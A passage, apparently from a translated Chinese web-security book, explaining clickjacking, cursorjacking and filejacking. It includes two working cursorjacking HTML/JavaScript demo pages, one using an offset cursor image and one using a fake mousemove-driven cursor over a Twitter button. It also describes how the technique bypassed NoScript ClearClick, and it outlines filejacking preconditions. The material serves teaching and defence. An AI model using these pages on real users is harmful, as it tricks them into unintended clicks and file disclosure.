
当用户决定点击某个位置时，点击会触发框架页面中按钮的 `onClick` 事件。正如你在框架页面的源代码中所看到的，这会弹出一个提示框对话框，如图 4-14 所示。

start figure 

[**Figure 4-14:**](#c04.html#figureanchor4-14) 成功的点击劫持

![c04f014.tif](image_fi/662090c04/c04f014.png)

end figure 

请注意，在之前的图中，你可以看到鼠标光标下方的背景和按钮。这是因为为了演示的需要，并没有将 IFrame 内容的不透明度设置为隐藏。

### 使用光标劫持

本节将探讨与点击劫持类似的攻击，但这次攻击重点在于鼠标光标。光标劫持在需要进行复杂的 UI 重定位攻击时非常有用。

start feature 

* * *

**NoScript ClearClick** NoScript 是一款为防止 XSS、XSRF 和各种 UI 重定位攻击而设计的流行 Firefox 扩展程序。其 ClearClick32 功能通过截取框架页面和父页面的截图（即你通常看到的样子）来识别并阻止点击劫持攻击。如果这两张截图不同，则说明发生了点击劫持攻击。利用此技术，NoScript 能够识别点击在透明元素上的操作，这些元素可能被用于实施点击劫持攻击。

* * *

end feature 

光标劫持的最初示例由 Eddy Bordi 展示，随后由 Marcus Niemietz 进行了优化。33 光标劫持通过自定义光标图像欺骗用户，使指针显示为相对实际鼠标位置的偏移。攻击者可以引导用户点击到目标元素上。下面是一个示例页面：

```
<html>
<head>
<style type="text/css"> 
 #c {
  cursor:url("http://localhost/basic_cursorjacking
  /new_cursor.png"),default;
 }
 #c input{
  cursor:url("http://localhost/basic_cursorjacking
  /new_cursor.png"),default;
 }
</style> 
</head>
<body>
 <h1> CursorJacking. Click on the 'Second' or 'Fourth' buttons. </h1>
<div id="c">
  <input type="button" value="First" onclick="alert('clicked on 1')">
          
  <input type="button" value="Second" onclick="alert('clicked on 2')">
          <br></br>
  <input type="button" value="Third" onclick="alert('clicked on 3')">
          
  <input type="button" value="Fourth" onclick="alert('clicked on 4')">
          
</div>
</body>
</html>
```

从 CSS 定义可以看出，鼠标光标被替换为自定义图像。如图 4-15 所示，该图像在右侧有固定偏移。

start figure 

[**Figure 4-15:**](#c04.html#figureanchor4-15) 点击“第二”按钮会导致点击“第一”按钮。

![c04f015.tif](image_fi/662090c04/c04f015.png)

end figure 

为了演示的需要，背景图像是可见的。在真实攻击中，图像仍是 PNG 格式，但背景透明。当目标点击“第二”或“第四”按钮时，实际上是点击页面左侧的按钮。真实的鼠标位置通过新光标图像隐藏。

Krzysztof Kotowicz34 和 Mario Heiderich 扩展了这些光标劫持技术。他们的新攻击向量完全隐藏了光标，并在 body 元素上添加了以下样式：

```
<body style="cursor:none">
```

随后会动态加载一个新的光标图像，并将其与 mousemove 事件关联。下面的代码演示了这种技术：

```
<html>
<head><title>Advanced cursorjacking by Kotowicz & Heiderich</title>
<style>
body,html {margin:0;padding:0}
</style>
</head>
<body style="cursor:none;height: 1000px;">
<img style="position: absolute;z-index:1000;" id=cursor 
 src="cursor.png" />
<div style=margin-left:300px;">
<h1>Is this a good example of cursorjacking?</h1>
</div>
<button style="font-size:
150%;position:absolute;top:130px;left:630px;">YES</button>
<button style="font-size: 150%;position:absolute;top:130px;
left:680px;">NO</button>
<div style="opacity:1;position:absolute;top:130px;left:30px;">
<a href="https://twitter.com/share" class="twitter-share-button"
data-via="kkotowicz" data-size="small">Tweet</a>
<script>!function(d,s,id){var 
js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id))
{js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/
widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,
"script","twitter-wjs");</script>
</div>
<script>
function shake(n) {
 if (parent.moveBy) {
 for (i = 10; i > 0; i--) {
  for (j = n; j > 0; j--) {
   parent.moveBy(0,i);
   parent.moveBy(i,0);
   parent.moveBy(0,-i);
   parent.moveBy(-i,0);
  }
 }
 }
}

shake(5);
  var  oNode = document.getElementById('cursor');

  var onmove = function (e) {  
    var nMoveX =  e.clientX, nMoveY =  e.clientY; 
    oNode.style.left = (nMoveX + 600)+"px";  
    oNode.style.top = nMoveY + "px";  
  }; 
  document.body.addEventListener('mousemove', onmove, true);
</script>
</body>
```

首先，将鼠标光标图像替换为自定义图像。其次，在页面 body 上附加一个新的事件监听器，监听 mousemove 事件。当真实鼠标移动时，事件触发监听器，使伪光标（可见的那个）相应移动。

通过 JavaScript，实时跟踪真实鼠标在 x 和 y 方向的移动，并更新伪光标的位置。正如你可能注意到的，前一节关于高级点击劫持中使用的技术相同。结果如图 4-16 所示，当目标点击 YES 按钮时，实际上是在点击 Twitter 按钮。

start figure 

[**Figure 4-16:**](#c04.html#figureanchor4-16) 点击 YES 按钮会导致点击 Twitter 按钮。

![c04f016.tif](image_fi/662090c04/c04f016.png)

end figure 

这种新光标劫持技术最初绕过了 NoScript 的 ClearClick 防护。请回顾之前关于 ClearClick 提供的防护，它能够识别点击是否在透明（不透明=0）元素上进行。而在前面的示例中，真实点击发生在非透明区域（Twitter 按钮），因此 NoScript 无法检测到攻击。此 ClearClick 绕过已在 NoScript 版本 2.2.8 RC1.35 中得到解决。

### 使用文件劫持

文件劫持允许通过浏览器内的巧妙 UI  manipulation 将目标机器的目录内容泄露到攻击者的服务器。结果是，在特定条件下，你可以从目标机器下载文件。成功执行此攻击的两个前提是：

Level1 **1.** 目标必须使用 Chrome，因为目前只有 Chrome 支持类似下面的 `webkitdirectory` 和 `directory` 输入属性：

```
<input type="file" id="file_x " webkitdirectory directory />
```

**2.** 攻击依赖于诱导目标点击某个位置，类似于其他 UI 重定位技术。在此情况下，输入元素被一个按钮元素遮挡，常见的透明度 CSS 技巧在前面的页面中已经看到。

/Level1

Kotowicz36 首先在 2011 年发表了这项 UI 重定位研究，之后分析了将文件劫持攻击推广给用户的社交工程手段的影响。

